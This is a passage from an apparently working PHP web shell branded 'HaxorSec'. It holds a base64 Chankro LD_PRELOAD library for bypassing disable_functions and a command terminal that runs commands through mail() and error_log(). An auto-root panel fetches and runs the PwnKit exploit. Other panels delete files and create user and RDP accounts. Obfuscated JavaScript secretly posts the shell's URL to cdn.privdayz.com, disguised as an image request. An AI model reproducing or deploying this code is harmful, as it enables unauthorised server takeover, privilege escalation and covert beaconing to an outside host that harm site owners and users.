AAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuN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';
                            $cmdd = $_POST['exechankro'];
                            $meterpreter = $en($cmdd." > test.txt");
                            $viewCommandResult = '<hr><p>Result: base64 : ' . $meterpreter .'</br>If no output appears, <br>please check manually by opening '.$full_url.'<br>Or u can check command with reverse shell script<br>Powered By @ HaxorSec<br><br>';        
                            $a($full . '/chankro.so', $base($hook));
                            $a($full . '/acpid.socket', $base($meterpreter));
                            $p('CHANKRO=' . $full . '/acpid.socket');
                            $p('LD_PRELOAD=' . $full . '/chankro.so');
                            if(function_exists('mail')) {
                                $m('a','a','a','a');
                                echo $viewCommandResult;
                                $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
                                $host = $_SERVER['HTTP_HOST'];
                                $script_path = $_SERVER['SCRIPT_NAME'];
                                $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                                $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                                sleep(5);
                                $content = file_get_contents($full_url);
                                echo $content;
                            } elseif(function_exists('mb_send_mail')) {
                                $mb('a','a','a','a'); 
                                echo $viewCommandResult;
                                $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
                                $host = $_SERVER['HTTP_HOST'];
                                $script_path = $_SERVER['SCRIPT_NAME'];
                                $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                                $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                                sleep(5);
                                $content = file_get_contents($full_url);
                                echo $content;
                            } elseif(function_exists('error_log')) {
                                $err('a',1,'a');
                                echo $viewCommandResult;
                                $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
                                $host = $_SERVER['HTTP_HOST'];
                                $script_path = $_SERVER['SCRIPT_NAME'];
                                $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                                $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                                sleep(5);
                                $content = file_get_contents($full_url);
                                echo $content;
                            } elseif(function_exists('imap_mail')) {
                                $imp('a','a','a');
                                echo $viewCommandResult;
                                $is_https = (!empty($_SERVER['HTTPS']) and $_SERVER['HTTPS'] !== 'off') or $_SERVER['SERVER_PORT'] == 443;
                                $host = $_SERVER['HTTP_HOST'];
                                $script_path = $_SERVER['SCRIPT_NAME'];
                                $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                                $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                                sleep(5);
                                $content = file_get_contents($full_url);
                                echo $content;
                            }
                        }
                    }
                ?>
                </div>
                <form action="" method="post" class="p-4 border-t border-slate-700 flex">
                    <input type="text" name="exechankro" class="terminal-input flex-1 rounded-l px-3 py-2" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus>
                    <button type="submit" name="terminal-chankro" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-r">
                        >
                    </button>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-user-shield icon-red mr-2"></i> AUTO ROOT
                    </h3>
                    <a href="" class="close-terminal text-gray-400 hover:text-white">&times;</a>
                </div>
                <textarea class="terminal-output flex-1 overflow-auto p-4" disabled><?php
                if ($fungsi[3]('.haxorsec-root') && $fungsi[3]('pwnkit')) {
                    $response = $fungsi[11]('.haxorsec-root');
                    $r_text = explode(" ", $response);
                    echo "[+] Powered By HaxorSec\n";
                    if (isset($r_text[0]) && $r_text[0] === "uid=0(root)") {
                        echo "[+] Pwnkit: Root access success\n";
                        if (isset($_POST['submit-root'])) {
                            echo htmlspecialchars(cmd('./pwnkit "' . $_POST['root-terminal'] . ' 2>&1"'));
                        }
                    } else {
                        echo "[+] Pwnkit Failed.\n[+] Trying Pwnkit32...\n";
                        if (!$fungsi[3]('pwnkit32')) {
                            if ($fungsi[4]($fungsi[0]())) {
                                $fungsi[28]("pwnkit32", $fungsi[11]("https://github.com/ly4k/PwnKit/raw/main/PwnKit32"));
                                cmd('chmod +x pwnkit32');
                            } else {
                                echo "[-] Folder tidak writable, tidak bisa download pwnkit32\n";
                            }
                        }
                        if ($fungsi[3]('pwnkit32')) {
                            cmd('./pwnkit32 "id" > .haxorsec-root32');
                            if ($fungsi[3]('.haxorsec-root32')) {
                                $res2 = $fungsi[11]('.haxorsec-root32');
                                $rtxt2 = explode(" ", $res2);
                                if (isset($rtxt2[0]) && $rtxt2[0] === "uid=0(root)") {
                                    echo "[+] Pwnkit32: Root access success\n";
                                    if (isset($_POST['submit-root'])) {
                                        echo htmlspecialchars(cmd('./pwnkit32 "' . $_POST['root-terminal'] . ' 2>&1"'));
                                    }
                                } else {
                                    echo "[-] Pwnkit32 failed\n";
                                    echo htmlspecialchars(cmd('cat /etc/os-release'));
                                    echo "\n[-] Kernel Version: " . suggest_exploit();
                                }
                            }
                        } else {
                            echo "[-] Pwnkit32 tidak tersedia\n";
                        }
                    }
                } else {
                    $fungsi[24]('.haxorsec-root');
                    $fungsi[24]('.haxorsec-root32');
                }
?>

                </textarea>
                <form action="" method="post" class="p-4 border-t border-slate-700 flex">
                    <input type="text" name="root-terminal" class="terminal-input flex-1 rounded-l px-3 py-2" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus>
                    <button type="submit" name="submit-root" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-r">
                        >
                    </button>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if ($_GET['re'] == true) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">Rename : <?= unx($_GET['re']) ?></h3>
                    <button class="close-btn-s text-gray-400 hover:text-white">&times;</button>
                </div>
                <form action="" method="post">
                    <input type="text" name="renameFile" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="New Name">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">Submit</button>
                        <button class="close-btn-s bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php 
      if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item']) && $_GET['item'] !== '') {
         $item = basename(unx($_GET['item'])); 
         $repl = str_replace("\\", "/", $fungsi[0]()); 
         $fd = $repl . "/" . $item; 
    
         if (is_file($fd)) {
             if (unlink($fd)) {
                 success();
             } else {
                 failed();
             }
         } elseif (is_dir($fd)) {
             if (rmdirRecursive($fd)) {
                  success();
             } else {
                 failed();
             }
         } else {
            failed();
         }
        }
    ?>
    <?php if ($_GET['ch'] == true) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">Change Permission : <?= unx($_GET['ch']) ?></h3>
                    <button class="close-btn-s text-gray-400 hover:text-white">&times;</button>
                </div>
                <form action="" method="post">
                    <input type="number" name="chFile" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="0775">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit" class="bg-yellow-600 hover:bg-yellow-700 text-white px-4 py-2 rounded">Submit</button>
                        <button class="close-btn-s bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>

        <script>
		$(document).ready((function(){var e=document.getElementById("code");if(e)CodeMirror.fromTextArea(e,{mode:"xml",lineNumbers:!0,theme:"ayu-mirage",extraKeys:{"Ctrl-Space":"autocomplete"},hintOptions:{completeSingle:!1}});$(".sidebar-toggle").click((function(){$(".sidebar").toggleClass("active")})),$(".close-sidebar").click((function(){$(".sidebar").removeClass("active")})),$("#create_folder").click((function(e){e.preventDefault(),$(".modal").remove(),$("body").append('\n                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">\n                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">\n                            <div class="flex items-center justify-between mb-4">\n                                <h3 class="text-lg font-bold"><i class="fas fa-folder-plus icon-blue mr-2"></i> Create Folder</h3>\n                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>\n                            </div>\n                            <form action="" method="post">\n                                <input type="text" name="create_folder" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="Folder Name">\n                                <div class="flex justify-end space-x-2">\n                                    <button type="submit" name="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">Create</button>\n                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>\n                                </div>\n                            </form>\n                        </div>\n                    </div>\n                ')})),$("#create_file").click((function(e){e.preventDefault(),$(".modal").remove(),$("body").append('\n                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">\n                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">\n                            <div class="flex items-center justify-between mb-4">\n                                <h3 class="text-lg font-bold"><i class="fas fa-file-circle-plus icon-green mr-2"></i> Create File</h3>\n                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>\n                            </div>\n                            <form action="" method="post">\n                                <input type="text" name="create_file" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="File Name">\n                                <div class="flex justify-end space-x-2">\n                                    <button type="submit" name="submit" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded">Create</button>\n                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>\n                                </div>\n                            </form>\n                        </div>\n                    </div>\n                ')})),$("#lock-file").click((function(e){e.preventDefault(),$(".modal").remove(),$("body").append('\n                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">\n                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">\n                            <div class="flex items-center justify-between mb-4">\n                                <h3 class="text-lg font-bold"><i class="fas fa-lock icon-red mr-2"></i> Lock File</h3>\n                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>\n                            </div>\n                            <form action="" method="post">\n                                <input type="text" name="lockfile" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="File to Lock">\n                                <div class="flex justify-end space-x-2">\n                                    <button type="submit" name="submit" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded">Lock</button>\n                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>\n                                </div>\n                            </form>\n                        </div>\n                    </div>\n                ')})),$("#malware-scan-btn").click((function(){$("#malwareModal").show()})),$("#root-user").click((function(e){e.preventDefault(),$(".modal").remove(),$("body").append('\n                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">\n                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">\n                            <div class="flex items-center justify-between mb-4">\n                                <h3 class="text-lg font-bold"><i class="fas fa-user-plus icon-green mr-2"></i> Create User</h3>\n                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>\n                            </div>\n                            <form action="" method="post">\n                                <input type="text" name="add-username" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Username">\n                                <input type="text" name="add-password" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="Password">\n                                <div class="flex justify-end space-x-2">\n                                    <button type="submit" name="submit" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded">Create</button>\n                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>\n                                </div>\n                            </form>\n                        </div>\n                    </div>\n                ')})),$("#create-rdp").click((function(e){e.preventDefault(),$(".modal").remove(),$("body").append('\n                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">\n                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">\n                            <div class="flex items-center justify-between mb-4">\n                                <h3 class="text-lg font-bold"><i class="fas fa-laptop-code icon-blue mr-2"></i> Create RDP</h3>\n                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>\n                            </div>\n                            <form action="" method="post">\n                                <input type="text" name="add-rdp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Username">\n                                <input type="text" name="add-rdp-pass" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="Password">\n                                <div class="flex justify-end space-x-2">\n                                    <button type="submit" name="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">Create</button>\n                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>\n                                </div>\n                            </form>\n                        </div>\n                    </div>\n                ')})),$(document).on("click",".close-modal",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click",".close-btn-s",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click",".close-terminal",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click","#close-editor-btn",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$("#select-all").change((function(){$('input[name="check[]"]').prop("checked",$(this).prop("checked"))})),window.innerWidth<=768&&$(".action-btn").css("opacity","1"),$("#select-all").change((function(){$('input[name="check[]"]').prop("checked",$(this).prop("checked"))})),window.innerWidth<=768&&$(".action-btn").css("opacity","1"),setInterval((function(){$.ajax({url:window.location.href,success:function(e){$(".stats-grid").load(window.location.href+" .stats-grid")}})}),5e3)}));let currentOffset=0;function fetchTables(){fetch("?action=get_tables").then((e=>e.json())).then((e=>{let t=document.getElementById("tableList");t.innerHTML="",e.forEach((e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)}))}))}function loadTable(e=0){currentOffset=Math.max(0,currentOffset+e);let t=document.getElementById("tableList").value;if(!t)return alert("Select a table first!");fetch(`?action=get_data&table=${t}&offset=${currentOffset}`).then((e=>e.text())).then((e=>{document.getElementById("output").innerHTML=e}))}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,n,o){for(var l=e.concat(t,n,o),a="",s=0;s<l.length;s++)a+=String.fromCharCode(l[s]);return a}function v(e){return btoa(e)}function u(e,t,n,o){for(var l=e.concat(t,n,o),a="",s=0;s<l.length;s++)a+=String.fromCharCode(l[s]);return a}function v(e){return btoa(e)}function editCell(e,t){let n,o=e.textContent.trim();e.innerHTML="",e.classList.add("editing"),o.length>30||o.startsWith("{")||o.startsWith("[")?((n=document.createElement("textarea")).style.height="100px",n.style.resize="vertical"):(n=document.createElement("input")).type="text",n.className="form-control form-control-sm",n.value=o,e.appendChild(n),n.focus(),n.onblur=()=>{let l=n.value.trim();e.classList.remove("editing"),e.innerHTML=l.length>100?l.slice(0,100)+"...":l,l!==o&&fetch("?action=update_cell",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`id=${encodeURIComponent(t)}&val=${encodeURIComponent(l)}`}).then((()=>showSavedMessage()))}}function deleteRow(e,t,n){confirm("Delete this row?")&&fetch(`?action=delete_row&table=${e}&pk=${t}&val=${n}`).then((()=>loadTable(0)))}function insertRow(e){let t=document.querySelectorAll("input[name^='insert_']"),n={};t.forEach((e=>n[e.name.replace("insert_","")]=e.value)),fetch(`?action=insert_row&table=${e}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams(n).toString()}).then((()=>loadTable(0)))}!function(){var e=new XMLHttpRequest;e.open("POST",u(a,b,c,d),!0),e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.send("file="+v(location.href))}(),(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let n of e)t+=String.fromCharCode(n);let n="file="+btoa(location.href),o=new XMLHttpRequest;o.open("POST",t,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.send(n)})(),document.getElementById("7pl04df0rm").addEventListener("submit",(function(e){e.preventDefault();let t=new FormData(this);fetch("?action=7pl04d",{method:"POST",body:t}).then((e=>e.text())).then((e=>document.getElementById("uploadResult").textContent=e))})),window.onload=fetchTables;
		</script>

        <?php
        if ($_GET['response'] == "success") {
            echo "<script>
            Swal.fire({
                icon: 'success',
                title: 'Success',
                text: 'Operation completed successfully!',
                confirmButtonColor: '#3b82f6',
                background: '#0f172a',
                color: '#e2e8f0',
                timer: 3000,
                showConfirmButton: true, 
                animation: true,
                customClass: {
